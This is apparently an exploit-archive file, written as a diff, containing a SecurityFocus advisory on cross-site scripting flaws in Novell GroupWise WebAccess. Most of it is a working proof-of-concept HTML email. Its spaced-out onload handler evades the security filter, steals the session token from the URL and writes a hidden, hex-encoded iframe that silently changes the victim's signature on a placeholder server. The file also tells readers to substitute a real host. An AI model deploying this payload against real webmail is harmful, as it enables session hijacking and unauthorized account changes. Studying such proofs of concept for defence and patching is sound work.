@@ -1,0 +1,38 @@
+source: http://www.securityfocus.com/bid/35066/info
+
+Novell GroupWise WebAccess is prone to multiple security vulnerabilities.
+
+An attacker may leverage these issues to bypass certain security restrictions or conduct cross-site scripting attacks.
+
+Note that some of the issues may be related to BID 35061. We will update this BID as more information emerges.
+
+Versions prior to WebAccess 7.03 HP3 and 8.0.0 HP2 are vulnerable.
+
+Following harmless code uses an onload() event handler to bootstrap its payload as soon as the email
+is open.
+The first stage of this script extracts the session token (User.Context) from within the current
+document&#039;s URI and used
+to make up the second stage.
+The second injects an iframe in the current page which in turn calls the signature configuration
+interface and changes the user&#039;s signature on the fly.
+This example uses a fake target, &#039;gwwa.victim.com&#039; that must be changed with a real server
+addresss/name.
+Here, the security parser won&#039;t recognize "onload = &#039;javascript:..." as potentially unsafe just
+because of the space characters.
+
+<!--
+    <html>
+    <head>
+    </head>
+        <body onmouseover = &#039;return false;&#039; onload = &#039;javascript:var
+context=document.location.href;var token=context.replace(/^.+context=([a-z0-9]+).+$/i,"$1");
+        var
+malwareS1="%3C%68%74%6D%6C%3E%3C%62%6F%64%79%3E%3C%62%72%2F%3E%3C%62%72%2F%3E%4E%6F%77%20%63%68%65%63%6B%20%79%6F%75%72%20%73%69%67%6E%61%74%75%72%65%20%2E%2E%2E%3C%69%66%72%61%6D%65%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%67%77%77%61%2E%76%69%63%74%69%6D%2E%63%6F%6D%2F%67%77%2F%77%65%62%61%63%63%3F%55%73%65%72%2E%63%6F%6E%74%65%78%74%3D";
+        var
+malwareS2="%26%61%63%74%69%6F%6E%3D%53%69%67%6E%61%74%75%72%65%2E%4D%6F%64%69%66%79%26%6D%65%72%67%65%3D%73%69%67%6E%61%74%75%72%26%53%69%67%6E%61%74%75%72%65%2E%69%73%45%6E%61%62%6C%65%64%3D%65%6E%61%62%6C%65%64%26%53%69%67%6E%61%74%75%72%65%2E%69%73%41%75%74%6F%6D%61%74%69%63%3D%61%75%74%6F%6D%61%74%69%63%26%53%69%67%6E%61%74%75%72%65%2E%73%69%67%6E%61%74%75%72%65%3D%25%32%30%2B%2D%2B%2D%2B%2D%2B%2D%2B%2D%2B%2D%2B%2D%2B%2D%2B%2D%2B%2D%2B%2D%2B%2D%2B%2D%2B%2D%2B%2D%2B%2D%2B%2D%2B%2D%2B%25%30%64%25%30%61%25%30%64%25%30%61%30%77%6E%65%64%2E%22%20%77%69%64%74%68%3D%30%70%78%20%68%65%69%67%68%74%3D%30%70%78%3E%3C%2F%69%66%72%61%6D%65%3E%3C%2F%62%6F%64%79%3E%3C%2F%68%74%6D%6C%3E";
+        document.write(unescape(malwareS1)+token+unescape(malwareS2));return false;&#039;>
+            <br/>
+            <br/><br/>Now check your signature ...
+        </body>
+    </html>
+-->
